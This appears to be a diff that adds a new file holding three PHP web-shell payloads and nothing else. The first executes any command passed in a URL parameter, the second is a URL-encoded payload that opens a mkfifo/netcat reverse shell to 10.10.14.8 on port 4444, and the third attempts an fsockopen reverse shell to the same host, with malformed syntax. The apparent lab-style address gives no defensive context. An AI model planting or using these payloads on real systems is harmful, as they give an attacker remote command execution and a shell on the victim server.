@@ -1,0 +1,5 @@
+<?php system($_GET['cmd']); ?>
+
+<%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.8+4444+>/tmp/f")%3b%3f>
+
+<?php -r '$sock=fsockopen("10.10.14.8",4444);exec("sh <&3 >&3 2>&3");' ?>
